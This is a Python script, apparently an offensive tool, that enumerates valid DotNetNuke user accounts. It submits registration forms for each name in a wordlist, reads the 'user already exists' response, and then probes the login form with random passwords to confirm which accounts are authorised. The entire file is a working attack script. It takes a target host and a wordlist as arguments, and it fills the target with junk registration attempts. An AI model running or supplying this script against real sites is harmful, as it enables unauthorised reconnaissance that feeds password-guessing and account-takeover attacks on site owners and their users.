import requests
from bs4 import BeautifulSoup as bs
import random
import string
import argparse


#RANDOM CONSTANTS
PARAM_SCRIPT_MANAGER = "dnn$ctr$dnn$ctr$Register_UPPanel|dnn$ctr$Register$registerButton"
PARAM_TSSM = ";Telerik.Web.UI, Version=2013.2.717.40, Culture=neutral, PublicKeyToken=121fae78165ba3d4:en-US:a713c6a1-0827-4380-88eb-63855ca4c2d9:45085116:27c5704c&ScriptManager_TSM=;;System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35:en:92dc34f5-462f-43bd-99ec-66234f705cd1:ea597d4b:b25378d2;Telerik.Web.UI, Version=2013.2.717.40, Culture=neutral, PublicKeyToken=121fae78165ba3d4:en:a713c6a1-0827-4380-88eb-63855ca4c2d9:16e4e7cd:f7645509:ed16cbdc"
PARAM_EVENT_TARGET_REGISTER = "dnn$ctr$Register$registerButton"
PARAM_EVENT_TARGET_LOGIN = "dnn$ctr$Login$Login_DNN$cmdLogin"
EXISTS_STRING = "A user already exists"
IS_AUTHORIZED_STRING = "not currently authorized"

def makeRandomString():
	letters = string.ascii_lowercase + string.ascii_uppercase
	return ''.join(random.choice(letters) for i in range(random.randint(7,12)))


def tryUser(host, user):
	# initial cookies
	sess = requests.Session()
	sess.get(url = "http://" + host)

	getRegister = sess.get(url = "http://" + host + "/Register")
	soup = bs(getRegister.content, 'html.parser')
	viewstate = soup.find('input', {'id' : '__VIEWSTATE'}).get('value')
	viewstate_generator = soup.find('input', {'id' : '__VIEWSTATEGENERATOR'}).get('value')
	event_validation = soup.find('input', {'id' : '__EVENTVALIDATION'}).get('value')

	registerInfoTags = []
	inputs = soup.findAll('input')
	for i in inputs:
		name = i.get('name')
		if "TextBox" in name:
			registerInfoTags.append(name)


	userField = registerInfoTags[0]
	passField1 = registerInfoTags[1]
	passField2 = registerInfoTags[2]
	dispNameField = registerInfoTags[3]
	emailField = registerInfoTags[4]

	randomPass = makeRandomString()
	randomEmail = makeRandomString() + "@" + makeRandomString() + ".com"

	params = { 	'ScriptManager' : PARAM_SCRIPT_MANAGER,
			'StylesheetManager_TSSM' : PARAM_TSSM,
			'__EVENTTARGET' : PARAM_EVENT_TARGET_REGISTER,
			'__EVENTARGUMENT' : "",
			'__VIEWSTATE' : viewstate,
			'__VIEWSTATEGENERATOR' : viewstate_generator,
			'__EVENTVALIDATION' : event_validation,
			userField : user,
			passField1 : randomPass,
			passField2 :  randomPass,
			dispNameField : makeRandomString(),
			emailField : randomEmail
		}
			
	send = sess.post(url = "http://" + host + "/Register", data=params)		

	if EXISTS_STRING in send.text:
		# technically, users which have "registered" but have not yet been authorized
		# still count as existing. Since we only want authorized accounts, lets perform
		# a check on potential username to see if its authorized
		isAuthorized = checkIfAuthorized(host, user)
		if isAuthorized:
			print("[+] " + user + " is valid!")

def checkIfAuthorized(host, user):

	sess = requests.Session()
	sess.get(url = "http://" + host)

	getLogin = sess.get(url = "http://" + host + "/Login")
	soup = bs(getLogin.content, 'html.parser')
	viewstate = soup.find('input', {'id' : '__VIEWSTATE'}).get('value')
	viewstate_generator = soup.find('input', {'id' : '__VIEWSTATEGENERATOR'}).get('value')
	event_validation = soup.find('input', {'id' : '__EVENTVALIDATION'}).get('value')
	txtUsername = "dnn$ctr$Login$Login_DNN$txtUsername"
	txtPasswd = "dnn$ctr$Login$Login_DNN$txtPassword"

	params = {      'ScriptManager' : PARAM_SCRIPT_MANAGER,
                        'StylesheetManager_TSSM' : PARAM_TSSM,
                        '__EVENTTARGET' : PARAM_EVENT_TARGET_LOGIN,
                        '__EVENTARGUMENT' : "",
                        '__VIEWSTATE' : viewstate,
                        '__VIEWSTATEGENERATOR' : viewstate_generator,
                        '__EVENTVALIDATION' : event_validation,
			txtUsername: user,
			txtPasswd : makeRandomString()
			}

	send = sess.post(url = "http://" + host + "/Login", data=params)
	return IS_AUTHORIZED_STRING not in send.text
	

def main():


	parser = argparse.ArgumentParser(description="Enumerate DotNetNuke accounts via register form")
	parser.add_argument('-t', nargs='?', metavar="target", help="URI of DotNetDuke Installation (Exclude http://)")
	parser.add_argument('-w', nargs='?', metavar="wordlist", help="Username wordlist.")

	args = parser.parse_args()

	words = []
	with open(args.w, "r") as f:
		words = f.readlines()

	print("[!] Trying usernames . . . ")
	for w in words:
		user = w.strip().lower()
		tryUser(args.t, user)

main()
		
